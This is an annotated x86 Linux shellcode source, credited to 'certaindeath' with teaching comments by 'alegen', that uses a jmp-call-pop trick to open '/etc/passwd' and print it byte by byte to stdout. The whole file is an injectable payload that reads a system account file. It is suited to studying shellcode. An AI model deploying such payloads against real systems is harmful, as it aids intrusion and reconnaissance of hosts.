/*
 * Linux/x86 file reader
 * Author: certaindeath
 * Explanations added by alegen
 */

_start:
    xor %eax, %eax      // set eax = 0
    xor %ebx, %ebx      // set ebx = 0
    xor %ecx, %ecx      // set ecx = 0
    xor %edx, %edx      // set edx = 0
    jmp two             // jump to two (line 51)

one:
    pop %ebx            // get location of file in ebx

    movb $5, %al        // set eax = 5, system call for sys_open
    xor %ecx, %ecx      // set ecx = 0, just append
    int $0x80           // call the kernel, get file descriptor

    mov %eax, %esi      // return value in eax, put it in esi
    jmp read            // jump to read (line 31)

exit:
    movb $1, %al        // set eax = 1, system call for sys_exit
    xor %ebx, %ebx      // set ebx = 0, exit value
    int $0x80           // call the kernel, we are done

read:
    mov %esi, %ebx      // put file descriptor in ebx
    movb $3, %al        // set eax = 3, system call for sys_read
    sub $1, %esp        // esp--
    lea (%esp), %ecx    // load effective address; value of ecx = address of esp
    movb $1, %dl        // set edx = 1, read one character at a time
    int $0x80           // call the kernel, read a character

    xor %ebx, %ebx      // set ebx = 0
    cmp %eax, %ebx      // if eax == ebx
    je exit             //   jump to exit (line 26)

    movb $4, %al        // set eax = 4, system call for sys_write
    movb $1, %bl        // set ebx = 1, this means stdout
    movb $1, %dl        // set edx = 1, just one character to print
    int $0x80           // call the kernel, print the character

    add $1, %esp        // esp++
    jmp read            // jump to read (line 31)

two:
    call one            // call one (line 16) and push location of file on stack
    .string "/etc/passwd"
